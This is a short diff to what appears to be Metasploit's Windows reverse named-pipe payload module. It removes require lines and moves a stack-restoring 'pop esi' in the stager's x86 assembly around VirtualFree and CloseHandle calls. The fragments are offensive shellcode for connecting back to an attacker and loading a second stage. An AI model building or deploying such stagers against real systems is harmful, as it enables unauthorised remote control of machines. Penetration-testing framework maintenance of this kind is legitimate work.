@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-
 module Msf
 
 ###
@@ -73,7 +67,7 @@ module Payload::Windows::ReverseNamedPipe
         pop ebp
       #{asm_reverse_named_pipe(opts)}
     ^
-    
+
     #"\xCC" + Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
@@ -245,6 +239,8 @@ module Payload::Windows::ReverseNamedPipe
         push eax                ; lpAddress
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+        ; restore the stack (one more pop after 2nd ReadFile call)
+        pop esi
 
       cleanup_file:
         ; clear up the named pipe handle
@@ -253,7 +249,6 @@ module Payload::Windows::ReverseNamedPipe
         call ebp                ; CloseHandle(...)
 
         ; restore the stack back to the connection retry count
-        pop esi
         pop esi
         pop esi
         dec [esp]               ; decrement the counter
